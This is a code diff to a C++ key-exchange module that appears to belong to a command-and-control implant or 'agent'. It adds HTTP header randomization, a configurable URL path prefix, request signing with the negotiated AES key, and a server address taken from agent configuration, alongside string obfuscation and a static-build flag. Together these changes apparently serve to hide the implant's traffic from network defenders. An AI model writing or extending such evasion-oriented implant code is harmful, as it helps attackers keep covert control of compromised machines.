@@ -53,6 +53,8 @@ std::string KeyExchange::send_public_key(const std::string& uuid) {
     CURL* curl = curl_easy_init();
     std::string response;
     if(!curl) return response;
+    struct curl_slist* headers = g_header_randomizer.build_list();
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     std::string pub = public_key_pem();
     std::string payload = "{\"uuid\":\"" + uuid + "\",\"public_key\":\"";
     std::string escaped;
@@ -63,11 +65,12 @@ std::string KeyExchange::send_public_key(const std::string& uuid) {
     }
     payload += escaped + "\"}";
 
-    curl_easy_setopt(curl, CURLOPT_URL, (server_url_ + OBFUSCATE("/key_exchange")).c_str());
+    curl_easy_setopt(curl, CURLOPT_URL, (server_url_ + g_agent_config.path_prefix + OBFUSCATE("/key_exchange")).c_str());
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
     curl_easy_perform(curl);
+    curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
     return response;
 }
@@ -96,6 +99,10 @@ g_uuid = fp.uuid;
         return;
     }
     aes_key_.assign((char*)out.data(), len);
+    g_request_signer.set_key(aes_key_);
+    g_aes_key = aes_key_;
 }
 
-extern "C" Module* create_module() { return new KeyExchange(OBFUSCATE("http://localhost:5000")); }
+#ifndef STATIC_AGENT
+extern "C" Module* create_module() { return new KeyExchange(g_agent_config.server_url); }
+#endif
